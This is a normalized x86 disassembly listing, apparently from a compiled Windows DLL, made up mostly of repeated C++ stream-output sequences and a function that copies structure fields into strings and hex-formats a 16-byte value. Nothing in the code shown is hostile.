or eax 0x4
push r--data
push esi
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x104 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x120 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x13c ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x158 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push r--data
push esi
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
push r--data
push esi
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
movzx edx [ edi + 0x174 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000cb10
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
movzx edx [ edi + 0x176 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000cb10
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
lea edx [ edi + 0x178 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
lea ecx [ edi + 0x1b0 ]
push ecx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
push eax
call sub_10008270
add esp 0x4
push r--data
push eax
call sub_100076f0
push eax
call sub_10008270
add esp 0xc
push r--data
push eax
call sub_100076f0
push eax
call sub_10008270
add esp 0xc
lea edx [ edi + 0x1e8 ]
push edx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
movzx ecx [ edi + 0x220 ]
add esp 0xc
push ecx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000c940
push eax
call sub_10008270
movzx edx [ edi + 0x221 ]
add esp 0x4
push edx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000c940
push eax
call sub_10008270
movzx ecx [ edi + 0x222 ]
add esp 0x4
push ecx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000c940
push eax
call sub_10008270
add esp 0x4
lea edx [ edi + 0x224 ]
push edx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
lea ecx [ edi + 0x25c ]
push ecx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
push eax
call sub_10008270
add esp 0x4
push r--data
push eax
call sub_100076f0
push eax
call sub_10008270
add esp 0xc
push r--data
push eax
call sub_100076f0
push eax
call sub_10008270
add esp 0xc
lea edx [ edi + 0x298 ]
push edx
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
add edi 0x2b8
push edi
push ecx
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
push eax
call sub_10008270
add esp 0xc
push eax
call sub_10008270
add esp 0x4
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_1000aaa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10029327
mov eax [ fs : 0x0 ]
push eax
sub esp 0x298
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0x8 ]
mov esi edx
mov eax esi
mov [ ebp - 0x1d8 ] esi
mov [ ebp - 0x1e8 ] 0x0
call sub_1000b790
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1e8 ] 0x1
cmp edi 0x12
je r-xdata
mov ebx [ ebx ]
cmp [ ebx + 0x21 ] 0x0
setne cl
mov [ esi + 0x294 ] cl
cmp [ ebx + 0x20 ] 0x0
setne dl
mov [ esi + 0x2b4 ] dl
test cl cl
je r-xdata
cmp edi 0x15
jne r-xdata
cmp [ esi + 0x2b4 ] 0x0
je r-xdata
lea eax [ ebp - 0x284 ]
push eax
call sub_1000d200
mov [ ebp - 0x4 ] 0x1
xor esi esi
jmp r-xdata
mov eax esi
jmp r-xdata
mov ebx [ ebx ]
mov eax [ ebx + 0xa0 ]
mov [ esi ] eax
movzx ecx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
shr ecx 0x1
push ecx
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x1e0 ] ebx
call sub_10001f10
movzx edx [ ebx + 0x38 ]
mov eax [ ebx + 0x3c ]
shr edx 0x1
lea edi [ esi + 0x3c ]
push edx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
mov al [ ebx + 0xa8 ]
not al
and al 0x1
mov [ esi + 0x58 ] al
mov ecx [ ebx + 0xa8 ]
shr ecx 0xa
and cl 0x1
mov [ esi + 0x59 ] cl
mov eax [ ebx + 0xa8 ]
test eax 0x100
je r-xdata
lea edx [ ebp - 0x284 ]
push edx
call sub_1000d200
mov [ ebp - 0x4 ] 0x5
xor esi esi
push 0x0
lea ecx [ ebp - 0x294 ]
push 0x2
push ecx
call sub_10016867
mov edx [ ebp - 0x284 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax + 0xc ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0x284 ]
push edx
push ecx
call eax
mov ecx [ ebp - 0x284 ]
mov eax [ ecx + 0x4 ]
lea eax [ ebp + eax - 0x284 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ ebp - 0x284 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + eax - 0x270 ]
movzx edx [ ebx + esi + 0x10 ]
lea eax [ ebp + eax - 0x284 ]
and ecx 0xfffff9ff
add esp 0xc
or ecx 0x800
mov [ eax + 0x14 ] ecx
push edx
lea eax [ ebp - 0x284 ]
push eax
call sub_1000cce0
inc esi
cmp esi 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
test al al
jns r-xdata
push 0x15
lea ecx [ esi + 0x5c ]
mov eax r--data
call sub_10001f10
jmp r-xdata
push 0x0
lea eax [ ebp - 0x2a4 ]
push 0x2
push eax
call sub_10016867
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x284 ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ ebp + ecx - 0x284 ]
push edx
push ecx
call eax
mov ecx [ ebp - 0x284 ]
mov eax [ ecx + 0x4 ]
lea eax [ ebp + eax - 0x284 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ ebp - 0x284 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + eax - 0x270 ]
movzx edx [ esi + ebx ]
lea eax [ ebp + eax - 0x284 ]
and ecx 0xfffff9ff
add esp 0xc
or ecx 0x800
mov [ eax + 0x14 ] ecx
push edx
lea eax [ ebp - 0x284 ]
push eax
call sub_1000cce0
inc esi
cmp esi 0x10
jb r-xdata
lea esi [ ebp - 0x84 ]
lea eax [ ebp - 0x284 ]
call sub_1000d2e0
mov esi eax
mov ebx [ ebp - 0x1d8 ]
add ebx 0x2b8
cmp ebx esi
je r-xdata
lea esi [ ebp - 0x1b8 ]
lea eax [ ebp - 0x284 ]
call sub_1000d2e0
mov [ ebp - 0x4 ] 0x2
mov esi [ ebp - 0x1d8 ]
add esi 0x298
mov edi eax
call sub_10001bb0
cmp [ ebp - 0x1a4 ] 0x8
jb r-xdata
test al 0x10
je r-xdata
push 0xa
lea ecx [ esi + 0x5c ]
mov eax r--data
call sub_10001f10
jmp r-xdata
movzx ecx [ ebx + 0x70 ]
mov eax [ ebx + 0x74 ]
shr ecx 0x1
lea edi [ esi + 0x78 ]
push ecx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
movzx edx [ ebx + 0x60 ]
mov eax [ ebx + 0x64 ]
shr edx 0x1
lea edi [ esi + 0x94 ]
push edx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
lea edx [ ebx + 0x18 ]
xor bl bl
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x1dc ] edx
call sub_1000c480
add esi 0xb0
mov edi eax
mov [ ebp - 0x4 ] 0x9
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
mov edi 0x7
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x284 ]
xor edx edx
xor esi esi
mov [ ebp - 0x1a4 ] 0x7
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b8 ] dx
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x1e4 ] eax
mov [ ebp + edx - 0x284 ] r--data
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x240 ] 0x1
lea eax [ ebp - 0x280 ]
mov [ ebp - 0x1ec ] eax
mov [ ebp - 0x280 ] r--data
je r-xdata
mov ecx [ ebp - 0x1b8 ]
push ecx
call sub_100173b1
add esp 0x4
lea eax [ esi + 0x5c ]
push eax
mov eax r--data
lea edx [ esi + 0x5c ]
push edx
mov eax r--data
jmp r-xdata
mov edx [ ebp - 0x1dc ]
xor ecx ecx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] cx
mov bl 0x1
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x54 ] 0x7
call sub_1000c480
mov [ ebp - 0x4 ] 0xa
mov ebx [ ebp - 0x1d8 ]
lea esi [ ebx + 0xcc ]
mov edi eax
call sub_10001bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x118 ] 0x8
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ ebp - 0x284 ]
xor edx edx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] dx
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x1ec ] eax
mov [ ebp + edx - 0x284 ] r--data
mov [ ebp - 0x4 ] edi
test [ ebp - 0x240 ] 0x1
lea eax [ ebp - 0x280 ]
mov [ ebp - 0x1e4 ] eax
mov [ ebp - 0x280 ] r--data
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100173b1
add esp 0x4
mov edi 0x7
xor ecx ecx
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ ebx ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ ebp - 0x270 ]
mov [ edx ] esi
mov eax [ ebp - 0x260 ]
mov [ eax ] esi
mov ecx [ ebp - 0x250 ]
mov [ ecx ] esi
mov edx [ ebp - 0x26c ]
mov [ edx ] esi
mov eax [ ebp - 0x25c ]
mov [ eax ] esi
mov ecx [ ebp - 0x24c ]
mov [ ecx ] esi
and [ ebp - 0x240 ] 0xfffffffe
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x280 ] r--data
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x248 ]
mov [ ebp - 0x1e0 ] eax
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x270 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
call sub_10001b20
mov esi [ ebp - 0x1e0 ]
xor eax eax
mov [ ebp - 0x118 ] 0x7
mov [ ebp - 0x11c ] 0x0
mov [ ebp - 0x12c ] ax
movzx ecx [ esi + 0x68 ]
mov eax [ esi + 0x6c ]
shr ecx 0x1
push ecx
lea ecx [ ebx + 0xe8 ]
call sub_10001f10
movzx edx [ esi + 0x40 ]
mov eax [ esi + 0x44 ]
shr edx 0x1
lea edi [ ebx + 0x104 ]
push edx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
movzx eax [ esi + 0x48 ]
shr eax 0x1
lea edi [ ebx + 0x120 ]
push eax
mov eax [ esi + 0x4c ]
mov ecx edi
call sub_10001f10
call sub_1000c8b0
movzx ecx [ esi + 0x58 ]
mov eax [ esi + 0x5c ]
shr ecx 0x1
lea edi [ ebx + 0x13c ]
push ecx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
movzx edx [ esi + 0x50 ]
mov eax [ esi + 0x54 ]
shr edx 0x1
lea edi [ ebx + 0x158 ]
push edx
mov ecx edi
call sub_10001f10
call sub_1000c8b0
mov ax [ esi + 0xba ]
mov [ ebx + 0x174 ] ax
mov cx [ esi + 0xb8 ]
mov [ ebx + 0x176 ] cx
xor bl bl
mov edx esi
lea ecx [ ebp - 0xbc ]
call sub_1000c480
mov [ ebp - 0x4 ] 0xb
mov esi [ ebp - 0x1d8 ]
add esi 0x178
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_100173b1
add esp 0x4
mov edx [ ebp - 0x270 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x260 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x250 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x26c ]
mov [ edx ] 0x0
mov eax [ ebp - 0x25c ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x24c ]
mov [ ecx ] 0x0
and [ ebp - 0x240 ] 0xfffffffe
mov [ ebp - 0x244 ] 0x0
mov [ ebp - 0x280 ] r--data
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0x248 ]
mov edi eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x270 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esi ]
mov [ ebx ] eax
mov [ esi ] ecx
mov eax [ esi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push esi
push ebx
call sub_10017050
add esp 0xc
jmp r-xdata
lea ecx [ ebp - 0x27c ]
mov [ ebp - 0x4 ] 0x3
call sub_10016412
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x284 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0x234 ]
mov [ ebp + eax - 0x284 ] r--data
push ecx
mov [ ebp - 0x234 ] r--data
call sub_10015fc5
mov esi [ ebp - 0x1d8 ]
add esp 0x4
mov edi [ eax ]
cmp edi esi
je r-xdata
mov edx [ ebp - 0x1e0 ]
mov [ ebp - 0xac ] ebx
xor eax eax
mov bl 0x1
lea ecx [ ebp - 0x19c ]
mov [ ebp - 0xa8 ] 0x7
mov [ ebp - 0xbc ] ax
call sub_1000c480
mov [ ebp - 0x4 ] 0xc
mov esi [ ebp - 0x1d8 ]
add esi 0x194
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x188 ] 0x8
jb r-xdata
mov edx [ ebp - 0xbc ]
push edx
call sub_100173b1
add esp 0x4
lea ecx [ ebp - 0x27c ]
mov [ ebp - 0x4 ] 0x7
call sub_10016412
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x234 ]
mov [ ebp + edx - 0x284 ] r--data
push eax
mov [ ebp - 0x234 ] r--data
call sub_10015fc5
mov eax [ ebp - 0x1d8 ]
add esp 0x4
jmp r-xdata
mov ebx [ eax ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ esi + 0x14 ]
mov [ ebx + 0x14 ] edx
xor eax eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
jmp r-xdata
mov ecx [ ebp - 0x1e0 ]
push ecx
call sub_100173b1
add esp 0x4
push esi
lea ecx [ ebp - 0x1dc ]
call sub_100163b9
mov eax [ edi + 0x4 ]
cmp eax esi
jbe r-xdata
xor edx edx
mov [ ebp - 0x19c ] dx
mov edx [ ebp - 0x1e0 ]
mov [ ebp - 0x18c ] ebx
add edx 0x8
xor bl bl
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x188 ] 0x7
mov [ ebp - 0x1dc ] edx
call sub_1000c480
mov [ ebp - 0x4 ] 0xd
mov esi [ ebp - 0x1d8 ]
add esi 0x1b0
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov ecx [ ebp - 0x19c ]
push ecx
call sub_100173b1
add esp 0x4
push edi
call sub_100173b1
add esp 0x4
push 0x0
lea ecx [ ebp - 0x1dc ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1dc ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ ebp - 0x1dc ]
xor ecx ecx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] cx
mov bl 0x1
lea ecx [ ebp - 0xf4 ]
mov [ ebp - 0x1c ] 0x7
call sub_1000c480
mov [ ebp - 0x4 ] 0xe
mov esi [ ebp - 0x1d8 ]
add esi 0x1cc
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0xe0 ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1dc ]
not esi
call sub_100163e1
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x1e0 ]
mov [ ebp - 0xe4 ] ebx
xor eax eax
add edx 0x10
xor bl bl
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0xe0 ] 0x7
mov [ ebp - 0xf4 ] ax
mov [ ebp - 0x1dc ] edx
call sub_1000c480
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x1d8 ]
add esi 0x1e8
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x150 ] 0x8
jb r-xdata
mov edx [ ebp - 0xf4 ]
push edx
call sub_100173b1
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ ebx + 0x4 ] eax
xor edx edx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x164 ] dx
mov edx [ ebp - 0x1dc ]
mov bl 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x150 ] 0x7
call sub_1000c480
mov [ ebp - 0x4 ] 0x10
mov ebx [ ebp - 0x1d8 ]
lea esi [ ebx + 0x204 ]
mov edi eax
call sub_10001bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x164 ]
push ecx
call sub_100173b1
add esp 0x4
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ ebp - 0x4c ] cx
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] 0x0
mov edx [ eax + 0xa8 ]
shr edx 0x9
and dl 0x1
mov [ ebx + 0x220 ] dl
mov ecx [ eax + 0xa8 ]
shr ecx 0x2
and cl 0x1
mov [ ebx + 0x221 ] cl
cmp [ eax + 0xc2 ] 0x0
lea ecx [ ebp - 0xa0 ]
setne dl
mov [ ebx + 0x222 ] dl
lea edx [ eax + 0x20 ]
xor bl bl
mov [ ebp - 0x1dc ] edx
call sub_1000c480
mov [ ebp - 0x4 ] 0x11
mov esi [ ebp - 0x1d8 ]
add esi 0x224
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x8c ] 0x8
jb r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ ebp - 0x1dc ]
xor ecx ecx
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] cx
mov bl 0x1
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x8c ] 0x7
call sub_1000c480
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x1d8 ]
add esi 0x240
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0xc4 ] 0x8
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ ebp - 0x1e0 ]
mov [ ebp - 0xc8 ] ebx
xor eax eax
add edx 0x28
xor bl bl
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0xc4 ] 0x7
mov [ ebp - 0xd8 ] ax
mov [ ebp - 0x1dc ] edx
call sub_1000c480
mov [ ebp - 0x4 ] 0x13
mov esi [ ebp - 0x1d8 ]
add esi 0x25c
mov edi eax
call sub_10001bb0
xor ebx ebx
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0xfc ] 0x8
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_100173b1
add esp 0x4
xor edx edx
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] dx
mov edx [ ebp - 0x1dc ]
mov bl 0x1
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0xfc ] 0x7
call sub_1000c480
mov [ ebp - 0x4 ] 0x14
mov ebx [ ebp - 0x1d8 ]
lea esi [ ebx + 0x278 ]
mov edi eax
call sub_10001bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x134 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_100173b1
add esp 0x4
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ ebp - 0x148 ] cx
mov [ ebp - 0x134 ] 0x7
mov [ ebp - 0x138 ] 0x0
cmp [ eax + 0xc0 ] cl
setne dl
mov [ ebx + 0x294 ] dl
cmp [ eax + 0xc1 ] cl
setne cl
mov [ ebx + 0x2b4 ] cl
test dl dl
je r-xdata
mov eax [ ebp - 0x148 ]
push eax
call sub_100173b1
add esp 0x4
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
lea edx [ ebp - 0x180 ]
lea ecx [ eax + 0x80 ]
push edx
call sub_1000c230
add esp 0x4
lea esi [ ebx + 0x298 ]
mov edi eax
mov [ ebp - 0x4 ] 0x15
call sub_10001bb0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x16c ] 0x8
jb r-xdata
mov eax ebx
lea edx [ ebp - 0x1d4 ]
lea ecx [ eax + 0x88 ]
push edx
call sub_1000c230
add esp 0x4
lea esi [ ebx + 0x2b8 ]
mov edi eax
mov [ ebp - 0x4 ] 0x16
call sub_10001bb0
cmp [ ebp - 0x1c0 ] 0x8
jb r-xdata
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
